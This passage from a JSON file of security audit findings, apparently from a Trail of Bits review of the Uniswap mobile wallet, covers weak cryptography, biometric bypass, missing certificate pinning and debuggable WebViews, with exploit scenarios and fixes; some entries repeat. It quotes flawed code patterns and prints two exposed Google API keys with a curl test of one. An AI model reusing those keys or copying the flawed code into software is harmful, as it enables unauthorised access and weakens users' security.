NotificationOpenedReceiver was a broadcast receiver. The OneSignal developer responded that the NotificationOpenedReceiver becomes an activity and is unexported, but it became silently exported in commit 560203a. The issue is of informational severity because we were not able to exploit this vulnerability during the audit, and our attempts indicate that there is no current threat to the Uniswap wallet from this issue. Exploit Scenario A victim installs a malicious application on his device. The malicious application uses the exported activity to steal sensitive les from the victims Uniswap mobile wallet, which allows the attacker to steal the victim's funds. Recommendations Short term, contact upstream library maintainers to resolve the issue or revise the necessity of using this exported activity. Keep in mind that removing the exported=true ag from the com.onesignal.NotificationOpenedReceiver activity in the AndroidManifest.xml le could break functionality.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Lack of certicate pinning for connections to the Uniswap server ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The Uniswap mobile wallet does not use certicate pinning to require HTTPS connections to the Uniswap server to use a specic and trusted certicate or to be signed by a specic certicate authority (CA). Certicate pinning is a method of allowing a specic server certicate or public key within an application to reduce the impact of person-in-the-middle (PITM) attacks. When making a connection to the back-end server, if the certicate presented by the server does not match the signature of the pinned certicate, the application should reject the connection. The more general approach for certicate pinning is to limit the set of trusted CAs to only those that are actually used by a system. The issue is of high diculty because a successful attack requires installing a new CA on a target device or compromising one of the CAs trusted by the device. A CA compromise would be a security incident impacting the whole internet, and the chance that adversaries would target the Uniswap wallet is small. Moreover, modern mobile operating systems have mitigations for compromised CA incidents. The impact of a successful PITM attack is similar to what would have happened if somebody compromised the Uniswap server, so it is of low severity (from the perspective of the wallet users). Exploit Scenario 1 As part of a high-prole attack, an attacker compromises a CA and issues a malicious but valid SSL certicate for the server. Several trusted CAs have been compromised in the past, as described in this Google Security blog post. Exploit Scenario 2 An attacker tricks a user into installing a CA certicate within their device's trust store. The attacker issues a malicious but valid SSL certicate and performs a PITM attack. Recommendations Short term, implement certicate pinning by embedding the specic certicates. If the server rotates certicates on a regular, short basis, then instead of pinning server certicates, limit the set of trusted CAs to the ones that will be used by the server. Long term, implement unit tests that verify that the application accepts only the pinned certicate. References  OWASP: Certicate and Public Key Pinning Control  TrustKit: Easy SSL pinning validation and reporting for iOS, macOS, tvOS, and watchOS 12. Third-party applications can take and read screenshots of the Android client screen Severity: Medium Diculty: High Type: Data Exposure Finding ID: TOB-UNIMOB2-12 Target: Uniswap Android application",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Local biometric authentication is prone to bypasses ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The Uniswap mobile wallet application uses local biometric authentication to authorize sensitive actions like transaction signing or showing the mnemonic screen. The authentication is based on a simple if statement (event-based) and not on any cryptographic primitive or remote endpoint (result-based). Result-based authentication is the recommended way to implement local authentication, because it is harder to bypass. With the result-based authentication, the wallets data cannot be obtained even by attackers with physical access to the device and with root privileges. The event-based authentication can be bypassed by, for example, using dynamic instrumentation on rooted devices or by exploiting operating system vulnerabilities. In the context of self-custody mobile wallets, the result-based authentication should bind biometric authentication with users condential data via a secure hardware (keychain or keystore). That is, the wallet should encrypt users data (private keys, mnemonics, etc.) using a secure hardware API. Then the hardware should be used to decrypt the data on-demand (e.g., for transaction signing or showing mnemonic view screen), and the hardware should authorize the decryption operation with biometrics (or screen lock PIN or password). The Uniswap mobile wallet performs biometric authentication with the tryLocalAuthenticate function, which uses the authenticateAsync function from the Expo LocalAuthentication library. This library does not provide a mechanism to implement result-based authentication. const result = await authenticateAsync(authenticateOptions) if (result.success === false) { return BiometricAuthenticationStatus.Rejected } Figure 13.1: The event-based local authentication implemented in the tryLocalAuthenticate function ([redacted]) On Android, result-based authentication can leverage the CryptoObject class to bind biometric authentication with cryptographic primitives. On iOS, a Keychain with a proper access control ag can be used. The issue is of high diculty because exploitation requires root access to the device. Exploit Scenario Bob steals Alices mobile device. He uses a public exploit to gain temporary root access to the device. He modies the /data/data/com.uniswap.dev/files/mmkv/mmkv.default le to change the wallets state, disabling biometric requirements. He then opens the wallet, displays a plaintext mnemonic, and uses it to steal all of Alices funds. Recommendations Short term, reimplement local authentication to be result-based. Preferably, users private keys and mnemonics should be stored encrypted with keychains or keystores key, and decrypted only on-demand and with biometric or screen lock PIN or password authorization. This solution may require replacing the currently used react-native Expo library. The event-based local authentication may be kept for app access authentication, as this authentication does not protect any condential information. However, we recommend implementing result-based authentication even for that part of authentication in order to store data that is not condential but still sensitive, such as wallets addresses and mnemonic IDs in encrypted form. Alternatively, ensure that the non-condential data is stored encrypted with operating system mechanisms like the Data Protection entitlement. Congure the wallet to require reauthorization before any action (instead of using time-based unlocking). This can be done with the setUserAuthenticationRequired and setUserAuthenticationParameters methods on Android, and SecAccessControlCreateFlags ags on iOS. On Android, the RnEthersRs class that uses Encrypted Shared Preferences can be leveraged, as it is already responsible for decrypting users mnemonics and private keys. Invalidate keys when a new ngerprint is added with the InvalidatedByBiometricEnrollment ag on Android and the biometryCurrentSet ag on iOS. Please note that this will require the user to recover the mnemonic whenever they change their devices PIN or add new ngerprints. Ensure the keychain item is constrained by the device state, preferably with the kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly accessibility class ag on iOS and using the canAuthenticate method on Android. For iOS, ensure that the item belongs to the wallets Access Group. Ensure that decrypted (plaintext) users private keys and mnemonics are not kept in wallet process memory when not necessary. This security measure will limit the time window for forensics attacks. When using the react-native wrapper library, ensure that the library correctly congures both Android and iOS authentication. Assuming that biometric requirement settings are left congurable, and depending on the actual implementation of the recommendations above, Reacts storage used to persist these settings may require encryption. Otherwise, an adversary may be able to modify a plaintext le to disable the result-based authentication. For example, the currently used react-native-mmkv modules encryptionKey setting may be used for encryption. Please note that it requires further security investigation to determine if using the encryptionKey setting is enough to protect the wallet. Long term, implement a second-factor authentication mechanism in addition to biometric authentication. Example second factors include user-provided passwords, passkeys, single sign-on with third-party identity providers, hardware devices like Yubico and Ledger, or login to a remote Uniswap service. User-provided passwords are a common mechanism for additional data encryption. Such solutions usually work by asking users to input their passwords, deriving the encryption key from the provided password, and decrypting users data with it. The password should be used only in addition to the more convenient biometric or screen lock PIN authentication. This mechanism would protect users data against oine attacks on the mobile devices secure hardware. References  OWASP: Local Authentication on Android and Local Authentication on iOS guidances  Leonard Eschenbaum: Bypassing Android Biometric Authentication, June 12, 2023  Panagiotis Papaioannou: A closer look at the security of React Native biometric libraries, April 6,",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. Wallet private keys and mnemonics may be kept in RAM ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The Uniswap Android mobile wallet decrypts data stored in encrypted shared preferences and caches the data in the wallet process memory. The cache is implemented in the RnEthersRs class (gure 14.1). The data contains plaintext private keys. Therefore, plaintext private keys may be kept unencrypted in RAM until the application is closed, even when the phone is locked. private fun retrieveOrCreateWalletForAddress(address: String): Long { val wallet = walletCache[address] if (wallet != null) { return wallet } val privateKey = retrievePrivateKey(address) val newWallet = walletFromPrivateKey(privateKey) walletCache[address] = newWallet return newWallet } Figure 14.1: The method of the RnEthersRs class that caches private keys in memory ([redacted]) The issue is informational because the wallet React application creates new instances of the RnEthersRs class on-demand (e.g., as shown in gure 14.2); therefore, the cache implemented by the class is short-living. However, this behavior invalidates the benets of having a cache, so it may be assumed that the intended use of the RnEthersRs class is to be a singleton. Moreover, the class is registered as a native module (gure 14.3), which again indicates that the class was intended to be a singleton. val ethersRs = RnEthersRs(reactContext) Figure 14.2: Example use of the RnEthersRs class ([redacted]) override fun createNativeModules( reactContext: ReactApplicationContext ): List<NativeModule> = listOf( RNEthersRSModule(reactContext), ThemeModule(reactContext), ) Figure 14.3: The RnEthersRs class is registered as a native module. ([redacted]) Exploit Scenario An attacker steals a users phone but cannot unlock it. He exltrates the RAM content, which contains the users private keys. The attacker uses the private key to take over the users wallet and drain her funds. Recommendations Short term, remove the cache mechanism from the RnEthersRs class so that data stored in encrypted shared preferences is decrypted only on demand. Long term, ensure that the application decrypts sensitive data only when it is needed (e.g., to sign a transaction or to display the wallet mnemonic) and removes it from RAM when it is no longer needed. 15. Wallet sends requests with private data before the application is unlocked Severity: Informational Diculty: High Type: Data Exposure Finding ID: TOB-UNIMOB2-15 Target: Uniswap Android application",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. Wallet does not require a minimum device-access security policy ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The Uniswap wallet application does not enforce a minimum device-access security policy, such as requiring the user to set a device passcode or PIN or to enroll a ngerprint for biometric authentication. If a user removes the operating-system-level PIN, the wallet ceases to require biometric authentication. Moreover, the wallet settings still show enabled for biometric requirements. This behavior may be surprising to users and is a security footgun. The vulnerability is presented in gure 17.1, which shows that the wallet treats both successful authentication and disabled authentication on the operating system level as a success. if ( biometricAuthenticationSuccessful(authStatus) || biometricAuthenticationDisabledByOS(authStatus) ) { successCallback?.(params) } else { failureCallback?.() } Figure 17.1: Part of the useBiometricPrompt method ([redacted]) The issue is informational because it cannot be properly xed without xing TOB-UNIMOB2-13. And if that nding is resolved as recommended, then this nding is also xed. Exploit Scenario A user of the Uniswap wallet enables biometric requirements for application access and transactions in the wallet. Then, he turns o biometric authentication on the OS level. He is convinced that the wallet is still protected with biometric authentication. The attacker steals the users phone and gets access to his private keys. The user blames Uniswap for failing to protect the wallet. Recommendations Short term, implement result-based authentication as recommended in nding TOB-UNIMOB2-13. This will mitigate the vulnerability described in this nding, as disabling the device-access security policy would make the wallet unusable on the cryptographic level. If the user has enabled biometric authentication requirements in the wallet but has disabled OS-level authentication, then switch o the requirements so that users will not be misguided. Consider whether disabling or changing OS-level authentication should make the wallet delete all data, as is recommended in TOB-UNIMOB2-13.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Bypassable password lockout due to reliance on the phone's clock for time comparisons ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The password lockout feature relies on the Date.now function to calculate the time left until a user can attempt to enter a password again. The Date.now function uses the systems clock, so an attacker can brute force the password by repeatedly trying a new password and advancing the phones clock to bypass the lockout feature. function calculateLockoutEndTime(attemptCount: number): number | undefined { if (attemptCount < 6) { return undefined } [skipped] if (attemptCount % 2 === 0) { return Date.now() + ONE_HOUR_MS } return undefined } Figure 18.1: The method for computing lockouts end time ([redacted]) const remainingLockoutTime = lockoutEndTime ? Math.max(0, lockoutEndTime - Date.now()) : 0 const isLockedOut = remainingLockoutTime > 0 Figure 18.2: Code checking if wallet should be locked out ([redacted]) Exploit Scenario An attacker steals a users phone. The attacker tries a large number of passwords from a list of common passwords, changing the phones time back and forth in between each attempt to bypass the lockout feature. The attacker nally learns the correct password and steals the users funds. Recommendations Short term, instead of Date.now, use a source of time that returns the monotonic timestamp since the system booted. When a user reboots their device, the timestamp will return to zero because zero seconds have passed since the system booted. A timestamp that is more recent than the timestamp of the last failed password attempt indicates that the system has rebooted and that the stored timestamp can safely be updated to zero. This measure means that users will have to wait through the full lockout time again after a reboot, but it ensures that attackers cannot manipulate the time left on a lockout. For monotonic timestamps on Android, use the elapsedRealtime function, and on iOS, use the clock_gettime function with the CLOCK_MONOTONIC argument.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. Debuggable WebViews ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The OneSignal SDK enables debugging of web contents loaded into any WebViews of the application for the debugging log level (gure 19.1) by the setWebContentsDebuggingEnabled ag. The OneSignal SDK allows Chrome Remote Debugging if OneSignal.LOG_LEVEL is equal to level DEBUG (5) or higher. The Uniswap mobile application has a verbose (6) log level enabled (gure 19.2), so any malicious application could inspect or modify the state of any WebView in the application. It is worth noting that access to the WebView context is not limited to OneSignal only; for example, it is possible to access the Privacy Policy view in the application. private static void enableWebViewRemoteDebugging() { if (Build.VERSION.SDK_INT < 19 || !OneSignal.atLogLevel(OneSignal.LOG_LEVEL.DEBUG)) { return; } WebView.setWebContentsDebuggingEnabled(true); } Figure 19.1: The enableWebViewRemoteDebugging method in the com.onesignal.WebViewManager package // 0 = None, 1 = Fatal, 2 = Errors, 3 = Warnings, 4 = Info, 5 = Debug, 6 = Verbose export const initOneSignal = (): void => { OneSignal.setLogLevel(6, 0) Figure 19.2: OneSignal setup in the Uniswap mobile wallet ([redacted]) Exploit Scenario An attacker discovers that OneSignal uses the Chrome DevTools protocol for debugging, which exposes the content in WebViews over Unix domain sockets. He prepares the malicious application that snis the content of a WebView in the Uniswap mobile application. An attacker obtains the sensitive data from the Uniswap mobile wallet, which is then used to steal funds. Recommendations Short term, change the setLogLevel (gure 19.2) to level 4 or lower. Long term, periodically check if the application exposes debuggable content on an Android device from the development machine. Also, using the jadx-gui tool, check if the decompiled APK contains the setWebContentsDebuggingEnabled ag and under what circumstances it enables debugging. References  Chrome for Developers: Remote debug Android devices  react-native-onesignal: Disabled setWebContentsDebuggingEnabled",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "20. Miscongured GCP API key exposed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The Google Cloud Platform API key is embedded in the Uniswap mobile wallet code (gure 20.1, 20.2), which makes it publicly accessible. A test of the API key endpoint responds with an HTTP 200 status code, denoting insucient key restrictions (gure 20.3). This could result in unanticipated costs and changes to the applications quota. <string name=\"google_api_key\">AIzaSyClPibETzdx02cLZtOW5oH7-nrpWDk77bI</string> <string name=\"google_crash_reporting_api_key\">AIzaSyClPibETzdx02cLZtOW5oH7-nrpWDk77bI</strin g> Figure 20.1: The part of the res/values/strings.xml le in the decompiled Uniswap mobile APK AIzaSyARi91A4ka3Tgk_lmbtF5pQE8kvt-odYr4 Figure 20.2: The part of the GoogleService-Info.plist le in the iOS Uniswap.app application $ curl https://www.googleapis.com/discovery/v1/apis\\?key\\=AIzaSyClPibETzdx02cLZtOW5oH7-nrpW Dk77bI { \"kind\": \"discovery#directoryList\", \"discoveryVersion\": \"v1\", \"items\": [ { (...) \"kind\": \"discovery#directoryItem\", Figure 20.3: A proof of the key without sucient restrictions that gives an HTTP 200 response and JSON data Recommendations Short term, specify the Android application that can use the key: set the application restriction to Android apps and add the application package name with the SHA- certicate ngerprint. For the iOS application, set the application restriction to iOS apps and add the bundle ID of the Uniswap iOS application. Long term, periodically review whether the application contains potentially sensitive API keys; if it does, ensure that these keys have congured secure restraints. References  Authenticate by using API keys",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "21. Lack of permissions for device phone number access or SIM card details ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The Uniswap mobile application references both Phone Number APIs (through the react-native-device-info dependency) and SIM card details (through AppsFlyer) without specifying the necessary permissions, such as Manifest.permission.READ_PHONE_STATE. While the application may not use the Phone Number APIs or the getSimOperatorName method during runtime, their presence in the application binary (gure 21.1, 21.2) or any included SDKs requires permission declaration. This absence of permissions can also lead to Google Play warnings during application review. Figure 21.1: The getPhoneNumberSync method calling getLine1Number telephonyManager = (TelephonyManager) context.getSystemService(\"phone\"); str2 = telephonyManager.getSimOperatorName(); Figure 21.2: Usage of the getSimOperatorName() method from TelephonyManager in the com.appsflyer.internal package Recommendations Short term, if the react-native-device-info or AppsFlyer dependency contains references to the Phone Number APIs or TelephonyManager and is unnecessary, consider removing it or asking the vendors for a build that does not contain code to access the data. If access to the phone number or SIM card details is required, declare the correct permissions.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "22. An insecure HostnameVerier that disables SSL hostname validation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The NoopHostnameVerifier class in the org.apache.http.conn.ssl package denes a HostnameVerifier() method that does not validate the servers hostname (gure 22.1). This allows an attacker to perform a PITM attack on a user's connection to spoof the server with the users hostname by providing a certicate from another host. Due to the lack of hostname verication, the client would accept this certicate. It is important to note that, according to the policy, Beginning March 1, 2017, Google Play will block publishing of any new apps or updates that use an unsafe implementation of HostnameVerifier. package org.apache.http.conn.ssl; import javax.net.ssl.HostnameVerifier; import javax.net.ssl.SSLSession; /* loaded from: classes5.dex */ public class NoopHostnameVerifier implements HostnameVerifier { public static final NoopHostnameVerifier INSTANCE = new NoopHostnameVerifier(); public final String toString() { return \"NO_OP\"; } @Override // javax.net.ssl.HostnameVerifier public boolean verify(String str, SSLSession sSLSession) { return true; } } Figure 22.1: The decompiled NoopHostnameVerifier class in the jadx-gui tool The issue is of informational severity because we were unable to exploit this nding by using a certicate signed by a valid CA but for invalid hostnames. In this case, logcat shows an SSL error. Exploit Scenario From the users perspective: An attacker carries out a PITM attack by using a CA-signed certicate issued for a domain the attacker owns. Because the implementation of the HostnameVerifier method accepts any certicate signed by a valid CA for any hostname, the attackers certicate is accepted. From the application owners perspective: The application is removed from or is blocked from being published in Google Play because of the unsafe implementation of the HostnameVerifier method, which does not validate hostnames. Recommendations Short term, identify which library introduces the vulnerable code and follow potential xes to ensure that the Uniswap mobile wallet uses the default hostname validation logic or that the custom HostnameVerifier interface returns false when the servers hostname does not meet the expected value. References  Google Help: How to resolve Insecure HostnameVerier 23. Sentry SDK uses getRunningAppProcesses to get a list of running apps Severity: Informational Diculty: High Type: Data Exposure Finding ID: TOB-UNIMOB2-23 Target: Uniswap Android application",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "24. BIP44 spec is not followed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The Uniswap mobile wallet automatically imports at most the rst 10 wallets associated with a mnemonic. Therefore, if a user has a mnemonic associated with more than 10 wallets, the Uniswap wallet will automatically import only the rst 10. BIP44 species that wallets should be imported until 20 subsequent addresses have no transaction histories (address gap limit). export const NUMBER_OF_WALLETS_TO_IMPORT = 10 Figure 24.1: Hard-coded limit of imported wallets ([redacted]) Moreover, the Uniswap wallet lters unused wallets by balances, instead of transaction history, as the BIP44 species. const accountsWithBalance = filteredAccounts?.filter( (address) => address.balance && address.balance > 0 ) if (accountsWithBalance?.length) return accountsWithBalance Figure 24.2: Filtering wallets by their balances ([redacted]) Recommendations Short term, as specied by BIP44, revise the code so that it keeps searching for wallets until it nds a gap of 20 unused wallets. Consider making a hard limit or pagination for wallets so that a bug in remote services that reports transaction histories will not make the wallet loop innitely. Filter unused wallets by their transaction histories and not by actual balances. Long term, ensure that the BIP44 implementation matches the BIP44 specication. Allow users to import wallets with arbitrary derivation paths.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "25. SafetyNet Verify Apps API not implemented in the Android client ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The Uniswap Android application does not use the SafetyNet Verify Apps API. Google Play provides the SafetyNet Verify Apps API to check whether potentially harmful applications are on a users device. Through the Verify Apps feature, Google monitors and proles the behavior of Android applications, informs users of potentially harmful applications, and encourages users to delete them. However, users are free to disable this feature and to ignore these warnings. The SafetyNet Verify Apps API can tell Uniswap whether the Verify Apps feature is enabled and whether potentially malicious applications remain on the users device. Uniswap can then take actions like warning users or disabling access to the wallet until the user resolves the problem or accepts the risk. This can provide an additional line of defense. Please note that the SafetyNet Verify Apps API is distinct from the deprecated SafetyNet Attestation API, and the SafetyNet Verify Apps API should be used together with the Play Integrity API. The Play Integrity API veries that interactions and server requests come from the genuine application binary running on a real Android device. By detecting potentially risky and fraudulent interactions, such as from tampered-with application versions and untrusted environments, the applications back-end server can respond appropriately to prevent attacks and reduce abuse. The Play Integrity API is a continuation of the deprecated SafetyNet Attestation API. Exploit Scenario Bob has unknowingly installed a malicious application, which the Verify Apps feature detects. He ignores the warnings to uninstall the application because it includes a game that he enjoys. He also uses the Uniswap application on the same device. The malicious application exploits an unpatched vulnerability in the Android system to extract the wallet keys from the phone RAM. The malicious application also tricks Bob into transferring his assets to a third party via a tapjacking attack. Recommendations Short term, implement the SafetyNet Verify Apps API to require that the Verify Apps feature be enabled for all Uniswap users and to ensure that known harmful applications are not installed on users devices. If malicious applications are detected by the API, alert wallet users about that, and instruct them on recommended actions they should take (e.g., uninstalling the applications in question). Long term, stay updated on new security features introduced in Android and continue adding relevant safety protections to the Uniswap mobile application. For added security protection, consider verifying the device's integrity using the Play Integrity API before using the Verify Apps API. References  Android Developers: SafetyNet Verify Apps API  Android Developers: App Security Best Practices",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Static AES-GCM nonce used for cloud backup encryption ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The cloud backup feature of the Uniswap mobile wallet allows users to store encrypted mnemonics in the Google Drive application data folder. AES-GCM cipher mode is used for the encryption. The mode requires a unique, random nonce for every encryption operation. However, the Uniswap mobile wallet uses a constant nonce of 16 zeros. The vulnerable nonce generation is highlighted in gure 4.1. fun encrypt(secret: String, password: String, salt: String): String { val key = keyFromPassword(password, salt) val cipher = Cipher.getInstance(\"AES/GCM/NoPadding\") cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(key, \"AES\"), IvParameterSpec(ByteArray(16))) val encrypted = cipher.doFinal(secret.toByteArray(Charsets.UTF_8)) return Base64.encodeToString(encrypted, Base64.DEFAULT) } Figure 4.1: AES-GCM encryption called by the backupMnemonicToCloudStorage function ([redacted]) While using constant nonces with AES-GCM is usually a critical vulnerability, the impact of the bug is reduced in the context of the Uniswap mobile wallet because the encryption key changes before every encryption. The key is derived from a password and a random salt, as shown in gures 4.1 and 4.2. val encryptionSalt = generateSalt(16) val encryptedMnemonic = withContext(Dispatchers.IO) { encrypt(mnemonic, password, encryptionSalt) } Figure 4.2: Part of the backupMnemonicToCloudStorage function ([redacted]) If the encryption key had been reused, the following attacks would be possible:  Authentication key recovery: The sub-key of the encryption key used for ciphertext authentication could be recovered from a few ciphertexts. This would allow an attacker to modify ciphertext in a meaningful way and recompute a valid authentication tag for the new version.  Reuse of keystream: The XOR of two ciphertexts would result in the XOR of two plaintexts. Given such data, an attacker could perform statistical analysis to recover both plaintexts. Exploit Scenario 1 In future releases of the Uniswap mobile wallet, the random salt is reused in a few subsequent encryptions. Users upload their mnemonics encrypted with a key that is the same for a few ciphertexts. The encrypted mnemonics are stolen from Google Drive and XORed pairwise. The criminals perform statistical analysis and obtain mnemonics in plaintext. They steal all users tokens. Exploit Scenario 2 Users reverse-engineer the Uniswap mobile wallet and learn that a constant nonce is used for AES-GCM encryption of backups. They publicly discuss this information on X (Twitter). Uniswaps credibility is negatively impacted. Recommendations Short term, replace the constant 16-byte nonce with a randomly generated, unique nonce in the encrypt function. Consider using nonces that are 12 bytes long instead of 16 bytes, as this length is more standard. Ensure that a strong, cryptographically secure pseudorandom number generator is used. Long term, create an inventory of ciphers and cryptographic parameters used in the Uniswap mobile wallet. An inventory could easily catch vulnerabilities like weak parameters or incorrect generation of certain cryptographic data. The inventory must be kept up-to-date to be useful, so an internal process should be created for that task. For example, any pull request changing cryptographic code should include an update to the inventory. Moreover, the inventory should be periodically compared to the current cryptographic standards. References  Antoine Joux, Authentication Failures in NIST version of GCM",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. Argon2i algorithm is used instead of Argon2id ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The Uniswap mobile wallet encrypts cloud backups with a key derived from a users password and a random salt. The Argon2i algorithm is used for this task. This algorithm has a few known attacks that reduce its memory requirements. Therefore, it is more prone to brute-force attacks than the recommended Argon2id algorithm. fun keyFromPassword(password: String, salt: String): ByteArray { val hash: Argon2KtResult = Argon2Kt().hash( mode = Argon2Mode.ARGON2_I, password = password.toByteArray(Charsets.UTF_8), salt = salt.toByteArray(Charsets.UTF_8), tCostInIterations = 3, mCostInKibibyte = 65536, parallelism = 4 ) return hash.rawHashAsByteArray() } Figure 5.1: Key derivation function using Argon2i algorithm ([redacted]) Dierences between variants of the Argon2 algorithms are explained in RFC 9106 (see gure 5.2). Argon2id provides both protection from side-channel analysis and brute-force attacks, while Argon2i focuses on the former. Figure 5.2: Section 1 of RFC 9106 (https://www.rfc-editor.org/rfc/rfc9106.html#name-introduction) Moreover, there is a bug in the salt generation function. The salt is Base64-encoded (see gure 5.3) and is not decoded to raw bytes before being passed to the Argon2i function. While this bug does not have security consequences, it may raise suspicion for users reading the code. Moreover, the library implementing the Argon2 function may misuse the encoded salt and, for example, truncate it to a predened length, thereby reducing entropy. fun generateSalt(length: Int): String { val bytes = ByteArray(length) val secureRandom = SecureRandom() secureRandom.nextBytes(bytes) return Base64.encodeToString(bytes, Base64.DEFAULT) } Figure 5.3: Base64-encoding of salt ([redacted]) Exploit Scenario Adversaries steal encrypted backups from Google Drive. They perform brute-force attacks on the stolen data. The time and cost to conduct the attack are much lower than one would expect due to the usage of a weaker-than-possible algorithm. Recommendations Short term, replace the Argon2i function with Argon2id. This will protect the key derivation from both side-channel and brute-force attacks. Please note that Argon2d is not recommended, as the threat model of a mobile application includes side-channel attacks (e.g., performed by a malicious application running in the background). Long term, create an inventory of cryptographic algorithms and parameters, as recommended to mitigate nding TOB-UNIMOB2-4. Provide reasoning for every algorithm and parameter choice that is not obvious. References  Dan Boneh, Henry Corrigan-Gibbs, and Stuart Schechter: Balloon Hashing: A Memory-Hard Function Providing Provable Protection against Sequential Attacks  Jol Alwen and Jeremiah Block: Towards Practical Attacks on Argon2i and Balloon Hashing",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Lack of certicate pinning for connections to the Uniswap server ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The Uniswap mobile wallet does not use certicate pinning to require HTTPS connections to the Uniswap server to use a specic and trusted certicate or to be signed by a specic certicate authority (CA). Certicate pinning is a method of allowing a specic server certicate or public key within an application to reduce the impact of person-in-the-middle (PITM) attacks. When making a connection to the back-end server, if the certicate presented by the server does not match the signature of the pinned certicate, the application should reject the connection. The more general approach for certicate pinning is to limit the set of trusted CAs to only those that are actually used by a system. The issue is of high diculty because a successful attack requires installing a new CA on a target device or compromising one of the CAs trusted by the device. A CA compromise would be a security incident impacting the whole internet, and the chance that adversaries would target the Uniswap wallet is small. Moreover, modern mobile operating systems have mitigations for compromised CA incidents. The impact of a successful PITM attack is similar to what would have happened if somebody compromised the Uniswap server, so it is of low severity (from the perspective of the wallet users). Exploit Scenario 1 As part of a high-prole attack, an attacker compromises a CA and issues a malicious but valid SSL certicate for the server. Several trusted CAs have been compromised in the past, as described in this Google Security blog post. Exploit Scenario 2 An attacker tricks a user into installing a CA certicate within their device's trust store. The attacker issues a malicious but valid SSL certicate and performs a PITM attack. Recommendations Short term, implement certicate pinning by embedding the specic certicates. If the server rotates certicates on a regular, short basis, then instead of pinning server certicates, limit the set of trusted CAs to the ones that will be used by the server. Long term, implement unit tests that verify that the application accepts only the pinned certicate. References  OWASP: Certicate and Public Key Pinning Control  TrustKit: Easy SSL pinning validation and reporting for iOS, macOS, tvOS, and watchOS",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Third-party applications can take and read screenshots of the Android client screen ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The android.media.projection API, introduced in Android 5.0, allows any third-party application on an Android device to take a screenshot of other running applications, including the Uniswap mobile wallet. A third-party application can capture everything on the devices screen, including sensitive information such as mnemonics and PIN codes, and may continue recording the screen even after the user terminates the application (but not after the user reboots the device). Enabling the FLAG_SECURE ag in the Uniswap client will prevent third-party applications from taking screenshots of the Uniswap mobile wallet. The nding is of high diculty because the user would have to install malicious software on their device, and then the software would have to correctly guess the time point at which to make the screenshot. The severity of the nding is medium because the worst-case result of a successful exploit is that the users private keys would be stolen. Exploit Scenario Alice prepares a malicious application, which Bob installs. Alices application secretly records Bobs Uniswap mobile application while he is looking at his wallet mnemonic. The malicious application exltrates the mnemonic, and Alice steals Bobs wallet. Recommendations Short term, protect all sensitive windows within the Uniswap Android application by enabling the FLAG_SECURE ag. This will prevent malicious third-party applications from recording the application and from taking screenshots of sensitive information. Also, the FLAG_SECURE ag will hide the Uniswap application in the Overview screen. Long term, ensure that the developer documentation is updated to include screen capture and recording as potential threats for data exposure.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. Wallet private keys and mnemonics may be kept in RAM ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
